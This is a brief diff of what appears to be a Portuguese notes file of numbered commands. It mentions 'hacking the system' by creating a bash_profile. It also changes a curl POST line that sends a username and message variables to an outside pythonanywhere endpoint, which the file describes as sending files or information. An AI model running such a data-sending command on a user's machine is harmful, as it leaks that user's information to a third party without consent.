@@ -20,5 +20,5 @@
  	#raquear sistema criando um bash_profile
 	cat ~/.bash_profile
  - comando 8: enviando arquivos ou informacoes para o pythonanywhere
-	curl -X POST -F "username=$user" -F "message=$message" https://teu_user.pythonanywhere.com/register
+	curl -X POST -F "username=$user" -F "message1=$message1" -F "message2=$message2" https://teu_user.pythonanywhere.com/register
 
